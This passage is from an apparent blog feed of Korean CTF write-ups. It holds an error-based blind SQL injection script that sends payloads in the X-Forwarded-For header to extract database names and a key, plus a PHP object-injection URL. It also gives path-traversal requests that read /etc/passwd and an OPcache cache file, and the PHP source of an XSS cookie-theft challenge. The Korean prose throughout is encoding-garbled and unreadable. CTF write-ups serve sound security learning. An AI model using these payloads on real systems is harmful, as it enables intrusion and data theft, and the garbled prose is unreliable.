class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">column</span>():</span></span><br><span class="line"><span class="keyword">global</span> column1, column2</span><br><span class="line">payload = <span class="string">&quot;&#x27;,if((substr((select column_name from information_schema.columns where table_schema=&#x27;n1ctf_websign&#x27; and table_name = &#x27;&#123;&#125;&#x27; limit &#123;&#125;,1),&#123;&#125;,1)=&#x27;&#123;&#125;&#x27;), exp(709 * length(&#x27;n1ctf&#x27;)),&#x27;False&#x27;));#&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>):</span><br><span class="line"><span class="keyword">if</span> i == <span class="number">0</span>:</span><br><span class="line">Len = <span class="number">2</span></span><br><span class="line"><span class="keyword">elif</span> i == <span class="number">1</span>:</span><br><span class="line">Len = <span class="number">3</span></span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(Len):</span><br><span class="line"><span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">48</span>, <span class="number">123</span>):</span><br><span class="line">headers[<span class="string">&quot;X-Forwarded-for&quot;</span>] = payload.<span class="built_in">format</span>(table_2, i, j+<span class="number">1</span>, <span class="built_in">chr</span>(k))</span><br><span class="line"><span class="keyword">if</span> k == <span class="number">92</span>:</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line">res = requests.get(url, headers=headers)</span><br><span class="line"><span class="keyword">if</span> <span class="string">&quot;&lt;code&gt;noip&lt;/code&gt;&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> res.text:</span><br><span class="line"><span class="keyword">if</span> i == <span class="number">0</span>:</span><br><span class="line">column1 += <span class="built_in">chr</span>(k).lower()</span><br><span class="line">print(<span class="string">&quot;[+] n1key, 1_Column_Name : &#123;&#125;&quot;</span>.<span class="built_in">format</span>(column1))</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line"><span class="keyword">elif</span> i == <span class="number">1</span>:</span><br><span class="line">column2 += <span class="built_in">chr</span>(k).lower()</span><br><span class="line">print(<span class="string">&quot;[+] n1key, 2_Column_Name : &#123;&#125;&quot;</span>.<span class="built_in">format</span>(column2))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">keylen</span>():</span></span><br><span class="line"><span class="keyword">global</span> key_len</span><br><span class="line">payload = <span class="string">&quot;&#x27;,if((select length(`key`) from &#123;&#125;)=&#123;&#125;, exp(709 * length(&#x27;n1ctf&#x27;)),&#x27;False&#x27;));#&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">100</span>):</span><br><span class="line">headers[<span class="string">&quot;X-Forwarded-for&quot;</span>] = payload.<span class="built_in">format</span>(table_2, i)</span><br><span class="line">res = requests.get(url, headers=headers)</span><br><span class="line"><span class="keyword">if</span> <span class="string">&quot;&lt;code&gt;noip&lt;/code&gt;&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> res.text:</span><br><span class="line">key_len = i</span><br><span class="line">print(<span class="string">&quot;[+] n1key, Key Length : &#123;&#125;&quot;</span>.<span class="built_in">format</span>(<span class="built_in">str</span>(i)))</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Key</span>():</span></span><br><span class="line"><span class="keyword">global</span> key</span><br><span class="line">payload = <span class="string">&quot;&#x27;,if((substr((select `key` from &#123;&#125;),&#123;&#125;,1)=&#x27;&#123;&#125;&#x27;), exp(709 * length(&#x27;n1ctf&#x27;)),&#x27;False&#x27;));#&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">25</span>):</span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">48</span>, <span class="number">123</span>):</span><br><span class="line">headers[<span class="string">&quot;X-Forwarded-for&quot;</span>] = payload.<span class="built_in">format</span>(table_2, i+<span class="number">1</span>, <span class="built_in">chr</span>(j))</span><br><span class="line">res = requests.get(url, headers=headers)</span><br><span class="line"><span class="keyword">if</span> <span class="string">&quot;&lt;code&gt;noip&lt;/code&gt;&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> res.text:</span><br><span class="line">key += <span class="built_in">chr</span>(j).lower()</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line">print(<span class="string">&quot;[+] n1key, Key : &#123;&#125;&quot;</span>.<span class="built_in">format</span>(key))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">flag</span>():</span></span><br><span class="line">url = <span class="string">&#x27;http://101.32.205.189/?input=O:4:&quot;flag&quot;:1:&#123;s:5:&quot;check&quot;;s:25:&quot;&#x27;</span> + key + <span class="string">&#x27;&quot;&#125;&#x27;</span></span><br><span class="line">res = requests.get(url)</span><br><span class="line">flag = res.text.split(<span class="string">&quot;&lt;/code&quot;</span>)[<span class="number">1</span>].split(<span class="string">&quot;&lt;code&gt;&quot;</span>)[<span class="number">0</span>].replace(<span class="string">&quot;\n&quot;</span>,<span class="string">&quot;&quot;</span>).replace(<span class="string">&quot;&gt;&quot;</span>,<span class="string">&quot;&quot;</span>)</span><br><span class="line">print(<span class="string">&quot;[+] &quot;</span> + flag)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line">table_name1()</span><br><span class="line">table_len2()</span><br><span class="line">table_name2()</span><br><span class="line">table_name2_column()</span><br><span class="line">column()</span><br><span class="line">keylen()</span><br><span class="line">Key()</span><br><span class="line"><span class="comment">#flag()</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">print(<span class="string">&quot;[+] Start&quot;</span>)</span><br><span class="line">main()</span><br></pre></td></tr></table></figure><p><img src="https://img1.daumcdn.net/thumb/R1280x0/?scode=mtistory2&fname=https://blog.kakaocdn.net/dn/dbezPc/btqK7BaOTRJ/KevJzpGaeCCMJe09wkZ5u1/img.png"></p><p>ìµìŠ¤í”Œë¡œì‡ ì½”ë“œë¥¼ í•˜ë‚˜í•˜ë‚˜ ì§œì„œ í™•ì¸í•´ë³´ë‹ˆ ë§ˆì§€ë§‰ì— keyë¼ëŠ” ì¹¼ëŸ¼ì´ ì¡´ì¬í•˜ëŠ” ê²ƒì„ ì•Œê²Œ ëê³ , key ê°’ì— ë¬¸ì œì—ì„œ ì›í•˜ëŠ” key ê°’ì´ ì¡´ì¬í•˜ëŠ” ê²ƒì„ ë³¼ ìˆ˜ ìˆì—ˆìŠµë‹ˆë‹¤. </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;101.32.205.189&#x2F;?input&#x3D;O:4:%22flag%22:1:&#123;s:5:%22check%22;s:25:%22n1ctf20205bf75ab0a30dfc0c%22&#125;</span><br></pre></td></tr></table></figure><p>ë§ˆì§€ë§‰ìœ¼ë¡œ ë½‘ì€ Key ê°’ì„ ì´ìš©í•´ì„œ POIë¥¼ í•´ì£¼ë‹ˆ FLAGë¥¼ ì¶œë ¥í•´ì£¼ëŠ” ê²ƒì„ ë³¼ ìˆ˜ ìˆì—ˆìŠµë‹ˆë‹¤. Error Based Blind SQL Injection (EXP í•¨ìˆ˜ í™œìš©) ê¸€ ì‘ì„±í•˜ê³  ì—¬ê¸°ì„œ ì“°ì´êµ°ìš” :)</p><blockquote><p>FLAG : n1ctf{you_g0t_1t_hack_for_fun}</p></blockquote><hr>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PHP Object Injection </tag>
            
            <tag> SQL Injection </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>3k CTF 2020 Write Up</title>
      <link href="2020/07/26/2020-07-26-3K-CTF-2020/"/>
      <url>2020/07/26/2020-07-26-3K-CTF-2020/</url>
      
        <content type="html"><![CDATA[<h2 id="Web-carthagods-496-pts"><a href="#Web-carthagods-496-pts" class="headerlink" title="(Web) carthagods [496 pts]"></a>(Web) carthagods [496 pts]</h2><blockquote><p>carthagods ë¬¸ì œëŠ” opcache ì—”ì§„ì—ì„œ ë°œìƒí•˜ëŠ” ì·¨ì•½ì ì„ ì´ìš©í•´ì„œ FLAG íŒŒì¼ì„ ë¦­ í•˜ëŠ” ë¬¸ì œì…ë‹ˆë‹¤.</p></blockquote><p><img src="https://img1.daumcdn.net/thumb/R1280x0/?scode=mtistory2&fname=https://blog.kakaocdn.net/dn/Ujhnb/btqF0QEIvAL/uvEXi0CpxfkTSUsCQtkvf0/img.png"></p><p>ë¬¸ì œë¡œ ë“¤ì–´ì™€ ë³´ë‹ˆ 6ê°€ì§€ ì¹´í…Œê³ ë¦¬ ê°€ ìˆëŠ” ê²ƒì„ ë³¼ ìˆ˜ ìˆìŠµë‹ˆë‹¤. ì¼ë‹¨ ì œì¼ ë¨¼ì € ëˆˆì— ë„ëŠ” ê±´ <code>FLAG</code>ë¼ëŠ” ì¹´í…Œê³ ë¦¬ ì…ë‹ˆë‹¤.</p><p><img src="https://img1.daumcdn.net/thumb/R1280x0/?scode=mtistory2&fname=https://blog.kakaocdn.net/dn/HFT8O/btqF15tIUIO/Ye9KcFOCVstLCRu8vCxEj0/img.png"></p><p><code>FLAG</code> ì¹´í…Œê³ ë¦¬ë¡œ ë“¤ì–´ì™€ ë³´ë‹ˆ <code>flag.php</code>ë¡œ ìš”ì²­ì„ í•˜ëŠ”ë° ìœ íŠœë¸Œ ì˜ìƒë§Œ ë³´ì´ëŠ” ê²ƒì„ ë³¼ ìˆ˜ ìˆìŠµë‹ˆë‹¤. ì†ŒìŠ¤ ì½”ë“œë¥¼ ë´ë„ í•„ìš”í•œ ê²ƒë“¤ì´ ë³´ì´ì§„ ì•Šì•„ì„œ <code>phpinfo</code>ë¥¼ í™•ì¸í•´ ë³´ê¸°ë¡œ í–ˆìŠµë‹ˆë‹¤.</p><p><img src="https://img1.daumcdn.net/thumb/R1280x0/?scode=mtistory2&fname=https://blog.kakaocdn.net/dn/u3mBf/btqF3F8UoSj/QyJ9Qt4UWSq3LYC9vdV1s0/img.png"></p><p><code>phpinfo</code> ì¹´í…Œê³ ë¦¬ë¡œ ë“¤ì–´ì™€ ë³´ë‹ˆ php ë²„ì „ì´ <code>7.2~</code>ì¸ ê²ƒì„ ë³¼ ìˆ˜ ìˆìŠµë‹ˆë‹¤. ì €ë²ˆì— ì œê°€ CVE ì·¨ì•½ì ë“¤ì„ ë‘˜ëŸ¬ë³´ë‹¤ê°€ <code>php 7.2.24</code>ì—ì„œ í„°ì§€ëŠ” ì·¨ì•½ì ì„ í•œ ë²ˆ ë³¸ ì ì´ ìˆëŠ”ë° í•´ë‹¹ ì·¨ì•½ì ì€ php 7.3.11ê³¼ 7.2.24ì—ì„œ RCEê°€ í„°ì§€ëŠ” ì·¨ì•½ì  <code>CVE 2019-11043</code>ì˜€ìŠµë‹ˆë‹¤. í•˜ì§€ë§Œ ì´ë²ˆ ë¬¸ì œëŠ” ì´ë¥¼ ì´ìš©í•´ì„œëŠ” í’€ ìˆ˜ ì—†ì„ ê±° ê°™ì•„ ì¢‹ë‹¤ ë§ì•˜ëŠ”ë° 2ì‹œê°„ì •ë„ <code>phpinfo</code>ì˜ ê°’ì„ ê¸°ì¤€ìœ¼ë¡œ êµ¬ê¸€ë§ì„ í•˜ë‹¤ê°€ <code>OPcache</code>ë€ ê²ƒì„ ì•Œê²Œ ë˜ì—ˆìŠµë‹ˆë‹¤.  </p><p><code>OPcache</code>ëŠ”  <code>PHP 7.0</code>ì— ë‚´ì¥ëœ ìƒˆë¡œìš´ ìºì‹œ ì—”ì§„ì´ë¼ê³  í•©ë‹ˆë‹¤. ì´ ì—”ì§„ì€ php ì½”ë“œë¥¼ <code>ì»´íŒŒì¼</code>í•˜ì—¬ ë‚˜ì˜¨ ê²°ê³¼ë¥¼ <code>ë°”ì´íŠ¸ ì½”ë“œ í˜•íƒœë¡œ ë©”ëª¨ë¦¬ì— ì €ì¥</code>í•´ì¤ë‹ˆë‹¤.</p><p>ë˜ php.ini ì„¤ì • íŒŒì¼ ë‚´ì— <code>ìºì‹œ ì •ë³´ì˜ í•´ë‹¹ í´ë”</code>ë¥¼ ì§€ì •í•´ì¤€ë‹¤ê³  í•©ë‹ˆë‹¤. ì¦‰, íŒŒì¼ì´ ì €ì¥ë  ê²½ë¡œê°€ ì •í•´ì§€ëŠ” ê²ƒ ì…ë‹ˆë‹¤. ê·¸ëŸ¼ ìºì‹œ ì •ë³´ì˜ í•´ë‹¹ í´ë”ê°€ <code>/admin/</code>ì´ë¼ê³  ê°€ì •í•˜ì— <code>flag.php</code> íŒŒì¼ì„ ì €ì¥í•œë‹¤ê³  í•´ë´…ì‹œë‹¤.</p><p>ì œì¼ ë¨¼ì € <code>flag.php</code> íŒŒì¼ì´ <code>OPcache</code>ì— ì˜í•´ ì»´íŒŒì¼ë˜ì–´ ê·¸ ê²°ê³¼ë¥¼ <code>ë°”ì´íŠ¸ ì½”ë“œ í˜•íƒœë¡œ ë©”ëª¨ë¦¬ì— ì €ì¥</code>ì„ í•  ê²ƒì¸ë° ì €ì¥ì€ <code>/admin/[system_id]/flag.php.bin</code>ì™€ ê°™ì´ ì´ë ‡ê²Œ ì €ì¥ì´ ë  ê²ƒì…ë‹ˆë‹¤. ê²½ë¡œ ë’¤ì—ëŠ” <code>system_id</code>ê°€ ë¶™ì€ í›„ì— ë’¤ì— íŒŒì¼ì´ ë¶™ëŠ” ê±° ê°™ìŠµë‹ˆë‹¤.</p><p><img src="https://img1.daumcdn.net/thumb/R1280x0/?scode=mtistory2&fname=https://blog.kakaocdn.net/dn/DxsFr/btqF1AVeB5A/jjPw9Nilk6wZQGDgd1GxrK/img.png"></p><p>í˜¹ì‹œë‚˜ ì´ ì·¨ì•½ì ì„ ì´ìš©í•´ì„œ í’€ ìˆ˜ ìˆì„ ê±° ê°™ì•„ì„œ <code>phpinfo</code>ì—ì„œ <code>opcache</code>ë¥¼ ê²€ìƒ‰í•´ ë³´ë‹ˆ <code>file_cache</code>ë¥¼ ì‚¬ìš©í•˜ëŠ” ê²ƒì„ ë³¼ ìˆ˜ ìˆìŠµë‹ˆë‹¤. ë³´ë©´ í•´ë‹¹ í´ë”ê°€ <code>/var/www/cache/</code>ë¡œ ë˜ì–´ ìˆëŠ” ê²ƒì„ ë³¼ ìˆ˜ ìˆìŠµë‹ˆë‹¤. ê·¸ëŸ¬ë‹ˆ ë§Œì•½ì— flag.phpë¼ëŠ” íŒŒì¼ì„ ì €ì¥í•œë‹¤ê³  í•˜ë©´ OPcacheì— ì˜í•´ ì»´íŒŒì¼ëœ í›„ì— <code>/var/www/cache/[system_id]/flag.php.bin</code>ìœ¼ë¡œ ì €ì¥ì´ ë  ê²ƒì…ë‹ˆë‹¤.</p><p>ìƒê°í•´ ë³´ë©´ <code>flag.php</code>ë¼ëŠ” íŒŒì¼ì´ ì‹¤ì œë¡œ ì¡´ì¬í•˜ê³  í•´ë‹¹ íŒŒì¼ì´ <code>/var/www/cache/[system_id]/flag.php.bin</code>ì— ì €ì¥ë˜ì–´ ìˆë‹¤ê³  ìƒê° ë“¤ì–´ ì´ ì‹œë‚˜ë¦¬ì˜¤ë¥¼ ì´ìš©í•´ í•´ê²°í•˜ê¸°ë¡œ í–ˆìŠµë‹ˆë‹¤.</p><p><img src="https://img1.daumcdn.net/thumb/R1280x0/?scode=mtistory2&fname=https://blog.kakaocdn.net/dn/BCg5P/btqF1CepJ02/LN0FckJWxn1Sdi6nusjAF1/img.png"></p><p>í•˜ì§€ë§Œ <code>system_id</code>ë¥¼ êµ¬í•˜ëŠ” ë°©ë²•ì„ ëª°ë¼ êµ¬ê¸€ë§ì„ í•´ë³´ì•˜ëŠ”ë°, <code>system_id</code>ë¥¼ ì°¾ì•„ì£¼ëŠ” ì½”ë“œê°€ <code>Gitbub</code>ì— ì˜¬ë¼ì™€ ìˆëŠ” ê²ƒì„ ë°œê²¬í–ˆìŠµë‹ˆë‹¤.</p><p><img src="https://img1.daumcdn.net/thumb/R1280x0/?scode=mtistory2&fname=https://blog.kakaocdn.net/dn/eOj3lN/btqF3b1ibhx/IPFpmRkCQenTc7oXDSaYbK/img.png"></p><p>í•´ë‹¹ ë¬¸ì œ <code>phpinfo</code> íŒŒì¼ ì†ŒìŠ¤ ì½”ë“œë¥¼ ë³µì‚¬í•´ info.htmlë¡œ ë§Œë“¤ì–´ ì¤€ í›„ì— ì½”ë“œë¥¼ ëŒë ¤ë³´ë‹ˆ <code>system Id</code>ë¥¼ ì°¾ì•„ì£¼ëŠ” ê²ƒì„ ë³¼ ìˆ˜ ìˆì—ˆìŠµë‹ˆë‹¤.</p><p>ì´ì œ <code>flag.php</code> íŒŒì¼ì´ <code>/var/www/cache/e2c6579e4df1d9e77e36d2f4ff8c92b3/var/www/html/flag.php.bin</code>ì— ì €ì¥ë˜ì–´ ìˆëŠ” ê²ƒì„ ì•Œê²Œ ë˜ì—ˆìŠµë‹ˆë‹¤. ê·¸ëŸ°ë° í•´ë‹¹ ê²½ë¡œë¡œ ì ‘ê·¼í•˜ë ¤ë©´ <code>LFI</code>ê°€ í„°ì§€ëŠ” ê³³ì„ ì°¾ì•„ì•¼ í•˜ë‹ˆ ì°¾ì•„ë³´ì•˜ìŠµë‹ˆë‹¤.</p><p><img src="https://img1.daumcdn.net/thumb/R1280x0/?scode=mtistory2&fname=https://blog.kakaocdn.net/dn/045Wy/btqF3cy7QQC/UKVTYm12XzJkAP4ndxu4B0/img.png"></p><p>ë¬¸ì œì—ì„œ ì†ŒìŠ¤ ì½”ë“œë¥¼ ë³´ë‹ˆ ì¼ë‹¨ <code>js</code> ì½”ë“œë“¤ì´ ë§ì´ ìˆì—ˆìŠµë‹ˆë‹¤. í•˜ë‚˜ í•˜ë‚˜ ë‹¤ ì ‘ì†í•´ë³´ë‹ˆ <code>path traversal</code>ì´ í„°ì§ˆ ê±° ê°™ì€ ë¶€ë¶„ì€ ë‚˜ì˜¤ì§€ ì•Šì•˜ìŠµë‹ˆë‹¤. ê·¸ëŸ¬ë‹¤ê°€ ë§ˆì§€ë§‰ì— <code>/js/main.js</code> ë¶€ë¶„ì—ì„œ ìƒìœ„ë¡œ ì˜¬ë¼ê°€ /jsë¡œ ì ‘ê·¼ì„ í•´ë³´ë‹ˆ ì´ìƒí•œ ê²ƒì„ ë°œê²¬í–ˆìŠµë‹ˆë‹¤.</p><p><img src="https://img1.daumcdn.net/thumb/R1280x0/?scode=mtistory2&fname=https://blog.kakaocdn.net/dn/4K7Ds/btqF3csnyxG/jpp2di3Rc8fFnGIeEo8zw1/img.png"></p><p>ë¶„ëª… <code>/js</code>ë¡œ ì ‘ê·¼ì„ í–ˆëŠ”ë° <code>?eba1b61134bf5818771b8c3203a16dc9=js</code> ì´ë ‡ê²Œ Parameterê°€ jsë¡œ ì ‘ê·¼ì„ í•´ì£¼ê³  ìˆì—ˆìŠµë‹ˆë‹¤. ë­”ê°€ ì € íŒŒë¼ë¯¸í„°ë¥¼ ì´ìš©í•´ì„œ <code>LFI</code>ê°€ í„°ì§ˆ ê±° ê°™ì•˜ìŠµë‹ˆë‹¤. ê·¸ë˜ì„œ <code>LFI</code> ì·¨ì•½ì ì˜ ìœ ë¬´ë¥¼ í™•ì¸í•˜ê¸° ìœ„í•´  <code>/etc/passwd</code>ë¡œ ì ‘ê·¼ì„ í•´ë³´ì•˜ìŠµë‹ˆë‹¤.</p><p><img src="https://img1.daumcdn.net/thumb/R1280x0/?scode=mtistory2&fname=https://blog.kakaocdn.net/dn/KqV2C/btqF1oAIjo1/JcbZGWoNFwcUQSkHhh2OlK/img.png"></p><p>ì²˜ìŒì—ëŠ” <code>http://carthagods.3k.ctf.to:8039/js/?eba1b61134bf5818771b8c3203a16dc9=../../../../../etc/passwd</code> ì´ë ‡ê²Œ ìš”ì²­ì„ ë³´ë‚´ì£¼ì—ˆëŠ”ë° ê³„ì† <code>403</code> ì—ëŸ¬ê°€ ë°œìƒí–ˆìŠµë‹ˆë‹¤. ê·¸ë˜ì„œ ê·¸ëƒ¥ ê²½ë¡œ ì—†ì´ <code>http://carthagods.3k.ctf.to:8039/?eba1b61134bf5818771b8c3203a16dc9=../../../../../etc/passwd</code> ì´ë ‡ê²Œ ë°”ë¡œ ë³´ë‚´ì£¼ë‹ˆ <code>LFI</code>ê°€ ì˜ í„°ì§€ëŠ” ê²ƒì„ ë³¼ ìˆ˜ ìˆì—ˆìŠµë‹ˆë‹¤. </p><p><img src="https://img1.daumcdn.net/thumb/R1280x0/?scode=mtistory2&fname=https://blog.kakaocdn.net/dn/bF0Dvp/btqF1RWL5xt/ZVfG3qz4EjnesJIRUgOVD1/img.png"></p><p>ê·¸ë˜ì„œ ë°”ë¡œ <code>flag.php</code>ê°€ ì €ì¥ë˜ì–´ ìˆëŠ” ê²½ë¡œ<code>http://carthagods.3k.ctf.to:8039/eba1b61134bf5818771b8c3203a16dc9=../../../../../../../var/www/cache/e2c6579e4df1d9e77e36d2f4ff8c92b3/var/www/html/flag.php.bin</code>ë¡œ ì ‘ê·¼ì„ í•´ì£¼ë‹ˆ <code>flag.php.bin</code> íŒŒì¼ì´ ì¶œë ¥ë˜ëŠ” ê²ƒì„ ë³¼ ìˆ˜ ìˆì—ˆìŠµë‹ˆë‹¤. ì´ë²ˆ ë¬¸ì œë¥¼ í’€ë©´ì„œ <code>opcache</code> ì—”ì§„ì— ëŒ€í•´ ì•Œì•„ê°€ ë§¤ìš° ì¢‹ì€ ë¬¸ì œì˜€ë‹¤ê³  ê°œì¸ì ìœ¼ë¡œ ìƒê°í•©ë‹ˆë‹¤.</p><blockquote><p>FLAG : 3k{Hail_the3000_years_7hat_are_b3h1nd}</p></blockquote><hr><h2 id="Web-XSSER-499-pts"><a href="#Web-XSSER-499-pts" class="headerlink" title="(Web) XSSER [499 pts]"></a>(Web) XSSER [499 pts]</h2><blockquote><p>XSSER ì±Œë¦°ì§€ëŠ” php object injection ì·¨ì•½ì ì„ ì´ìš©í•´ì„œ XSSë¥¼ íŠ¸ë¦¬ê±°í•˜ê³ , window.nameì„ ì´ìš©í•´ ê¸¸ì´ ì œí•œì„ ìš°íšŒí•´ XSSë¥¼ ì´ìš©í•´ì„œ ì¿ í‚¤ë¥¼ íƒˆì·¨í•˜ëŠ” ë¬¸ì œ ì…ë‹ˆë‹¤.</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span></span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$isAdmin</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$nam</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;name = <span class="variable">$nam</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;isAdmin=<span class="literal">False</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">ob_start();</span><br><span class="line"><span class="keyword">if</span>(!(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;login&#x27;</span>])))&#123;</span><br><span class="line">    <span class="variable">$use</span>=<span class="keyword">new</span> User(<span class="string">&#x27;guest&#x27;</span>);</span><br><span class="line">    <span class="variable">$log</span>=serialize(<span class="variable">$use</span>);</span><br><span class="line">    header(<span class="string">&quot;Location: ?login=<span class="subst">$log</span>&quot;</span>);</span><br><span class="line">    <span class="keyword">exit</span>();</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$new_name</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;new&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$new_name</span>))&#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span>(stripos(<span class="variable">$new_name</span>, <span class="string">&#x27;script&#x27;</span>))<span class="comment">//no xss :p </span></span><br><span class="line">                 &#123; </span><br><span class="line">                    <span class="variable">$new_name</span> = htmlentities(<span class="variable">$new_name</span>);</span><br><span class="line">                 &#125;</span><br><span class="line">        <span class="variable">$new_name</span> = substr(<span class="variable">$new_name</span>, <span class="number">0</span>, <span class="number">32</span>);</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&#x27;&lt;h1 style=&quot;text-align:center&quot;&gt;Error! Your msg &#x27;</span>.<span class="variable">$new_name</span>.<span class="string">&#x27;&lt;/h1&gt;&lt;br&gt;&#x27;</span>;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&#x27;&lt;h1&gt;Contact admin /req.php &lt;/h1&gt;&#x27;</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"> <span class="keyword">if</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>] == <span class="string">&#x27;127.0.0.1&#x27;</span>)&#123;</span><br><span class="line">            setcookie(<span class="string">&quot;session&quot;</span>, <span class="variable">$flag</span>, time() + <span class="number">3600</span>);</span><br><span class="line">        &#125;</span><br><span class="line"><span class="variable">$check</span>=unserialize(substr(<span class="variable">$_GET</span>[<span class="string">&#x27;login&#x27;</span>],<span class="number">0</span>,<span class="number">56</span>));</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$check</span>-&gt;isAdmin)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;welcome back admin &#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line">ob_end_clean();</span><br><span class="line">show_source(<span class="keyword">__FILE__</span>);</span><br></pre></td></tr></table></figure><p>ë§Œì•½ì— <code>login</code>ì˜ ê°’ì´ ì¡´ì¬í•˜ì§€ ì•Šìœ¼ë©´ ìƒì„±ì í•¨ìˆ˜ë¥¼ í†µí•´ ìƒì„±í•˜ê³  <code>Location</code>ì„ í•´ì¤ë‹ˆë‹¤. ê·¸ë˜ì„œ ë¬¸ì œë¡œ ë“¤ì–´ì˜¤ê²Œ ë˜ë©´ ë°”ë¡œ <code>?login=</code>ìœ¼ë¡œ Locationì´ ë˜ëŠ” ê±° ê°™ìŠµë‹ˆë‹¤. ê·¸ëŸ¬ë‹ˆ ì´ ë¶€ë¶„ì—ì„œ ì—ëŸ¬ ë°œìƒì„ ìœ ë°œí•´ì•¼ ë‹¤ìŒ ë™ì‘ë“¤ì„ ì‹¤í–‰ í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ì—ëŸ¬ê°€ ë‚˜ì§€ ì•Šìœ¼ë©´ <code>new</code>ì˜ ê°’ì„ ë°›ê³ , <code>new</code>ì˜ ê°’ë¡œ xssë¥¼ í„°íŠ¸ë¦´ ìˆ˜ ìˆëŠ”ë° ì´ ë¶€ë¶„ì´ ì‹¤í–‰ì´ ë˜ì§€ ì•Šê³  ë°”ë¡œ ë¦¬ë‹¤ì´ë ‰ì…˜ì´ ë˜ëŠ” ê²ƒ ì…ë‹ˆë‹¤. ì²« ë²ˆì§¸ ëª©í‘œëŠ” ì €ê¸°ì—ì„œ ì—ëŸ¬ë¥¼ ë°œìƒì‹œí‚¤ë©´ ë  ê±° ê°™ìŠµë‹ˆë‹¤.</p><p>ê·¸ë¦¬ê³  ìœ„ì—ì„œ ë§í–ˆì§€ë§Œ ë°‘ì— ë³´ë©´ <code>new</code>ë¼ëŠ” íŒŒë¼ë¯¸í„°ì˜ ê°’ì´ ë”ìœ¼ë¡œ ë°”ë¡œ ë“¤ì–´ê°€ëŠ” ê²ƒì„ ë³¼ ìˆ˜ ìˆìŠµë‹ˆë‹¤. ë˜í•œ <code>new</code>ì˜ ê°’ì´ <code>new_name</code>ìœ¼ë¡œ ë“¤ì–´ê°€ ê²€ì¦ì„ í•˜ê²Œ ë©ë‹ˆë‹¤. ì´ë•Œ <code>script</code>ë¼ëŠ” ë¬¸ìê°€ ìˆìœ¼ë©´ ì°¸ì´ ë˜ì–´ <code>htmlentitle(</code>) í•¨ìˆ˜ë¡œ ì—”í‹°í‹°ë¡œ ë³€í™˜í•˜ê¸° 